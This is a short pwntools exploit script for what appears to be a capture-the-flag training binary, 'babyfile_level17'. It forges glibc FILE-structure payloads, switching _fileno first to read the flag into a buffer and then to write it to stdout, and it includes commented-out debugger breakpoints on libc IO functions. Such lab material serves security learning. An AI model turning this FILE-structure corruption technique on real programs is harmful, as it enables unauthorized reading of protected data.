#!/usr/bin/env python3
from pwn import *

# Process setup
p = process('./babyfile_level17')
s = '''
b * fopen
b * fopen64+202
b * fread
b * fread+184
b * fwrite
b * fwrite+184
b * __GI__IO_wdoallocbuf
b * _IO_wfile_overflow+41
b * _IO_2_1_stdout_
'''


p.sendline(b"open_flag")
p.sendline("open_file")
p.sendline("new_note 0 96")

p.sendline("write_fp")



offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(0) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(0)
payload += p64(0+0x120) 
payload += b'\x00' * (0x8 * 8)
payload += p64(3) # _fileno = 1, stdout

p.sendline(payload)




p.sendline(b"read_file 0")


p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(0) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(0)
payload += p64(0) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout

p.sendline(payload)

#gdb.attach(p, s)
#time.sleep(1)

p.sendline(b"write_file 0")


p.interactive()

